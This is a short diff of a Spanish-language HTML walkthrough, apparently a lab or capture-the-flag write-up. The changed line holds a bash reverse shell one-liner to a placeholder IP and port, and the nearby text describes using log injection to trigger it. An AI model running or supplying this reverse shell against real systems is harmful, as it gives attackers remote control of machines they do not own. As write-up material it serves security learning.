@@ -61,7 +61,7 @@
 <img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 131145.png"/>
 
 <h3>Vemos que nos esta ejecutando comandos. Vamos a crearnos un nano shell.sh para ganar una reverse shell con el siguiente contenido: </h3>
-<h3>bash -i >& /dev/tcp/<IP>/<PORT> 0>&1</h3>
+<h3>bash -i >& /dev/tcp/[IP]/[PORT] 0>&1</h3>
 
 <h3>Nos levantamos un servidor en python para inyectar la reverse shell dentro de los logs</h3>
 <img width="956" height="776" src="../reverse/image/Captura de pantalla 2026-08-09 131523.png"/>
